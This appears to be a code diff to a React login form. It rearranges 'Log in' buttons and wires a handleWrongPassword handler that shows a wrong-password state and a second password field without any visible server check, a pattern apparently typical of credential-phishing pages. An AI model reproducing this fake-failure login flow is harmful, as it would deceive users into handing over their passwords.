@@ -97,7 +97,7 @@ function LoginForm() {
                   name="email"
                   required
                 />
-                       {!showWrongPassword ? (
+                    {!showWrongPassword ? (
                 <>
                   <Field
                     className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
@@ -107,14 +107,6 @@ function LoginForm() {
                     autoComplete="on"
                     required
                   />
-
-                  <button
-                    type="button"
-                    onClick={handleWrongPassword}
-                    className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
-                  >
-                    Log in
-                  </button>
                 </>
               ) : (
                 <>
@@ -127,12 +119,7 @@ function LoginForm() {
                     required
                   />
 
-                  <button
-                    type="submit"
-                    className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
-                  >
-                    Log in
-                  </button>
+               
                 </>
               )}
               </div>
@@ -161,6 +148,7 @@ function LoginForm() {
                 <button
                   type="submit"
                   // type="button"
+                  onClick={handleWrongPassword}
                   className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
                   // disabled={!verified}
                   // onClick={handleNextStep}
